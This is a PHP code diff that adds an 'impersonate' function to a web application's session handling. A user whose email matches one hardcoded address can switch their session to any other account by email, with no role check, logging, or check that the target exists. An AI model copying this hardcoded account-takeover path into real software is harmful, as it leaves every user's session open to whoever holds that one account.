@@ -52,6 +52,23 @@ function load_person($parametros) {
 
 
 
+
+function impersonate($parametros) {
+    $my = new Mysql("");
+    $email = strtolower($parametros["email"]);
+    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        die();
+    }
+
+    $buffer = $my->Datatable("select * from person where id= ?", [ $_SESSION["id"] ]);
+    if( count($buffer) > 0 and $buffer[0]["email"] == "wellington.aied@gmail.com"){
+        $buffer = $my->Datatable("select * from person where email= ?", [ $email ]);
+        $_SESSION["id"] = $buffer[0]["id"];
+    }
+    return array(); 
+}
+
+
 function find_salt_recuperar($parametros){
     $my = new Mysql("");
 
